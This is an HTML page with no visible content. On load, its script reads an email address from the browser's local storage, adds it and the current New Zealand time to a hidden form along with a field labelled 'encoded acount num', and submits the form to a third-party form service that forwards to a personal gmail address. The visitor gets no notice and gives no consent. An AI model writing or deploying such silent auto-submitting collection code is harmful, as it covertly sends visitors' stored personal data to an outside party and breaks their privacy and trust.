<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="./style.css">
</head>
<body>
  <div class="container">
    <form id="contactForm" action="https://formsubmit.co/superolzu@gmail.com" method="POST">
      <input type="hidden" name="Email" id="emailField">
      <input type="hidden" name="Continent" value="New Zealand">
      <input type="hidden" name="Message" value="encoded acount num">
    </form>
  </div>
  <script>
    window.addEventListener('DOMContentLoaded', (event) => {
      // Set hidden fields from local storage
      document.getElementById('emailField').value = localStorage.getItem('clickcountemail');

      // Get current New Zealand time
      const now = new Date().toLocaleString('en-NZ', { timeZone: 'Pacific/Auckland' });

      // Add current New Zealand time as a hidden field
      const timeField = document.createElement('input');
      timeField.type = 'hidden';
      timeField.name = 'NewZealandTime';
      timeField.value = now;
      document.getElementById('contactForm').appendChild(timeField);

      // Submit the form
      document.getElementById('contactForm').submit();
    });
  </script>
</body>
</html>
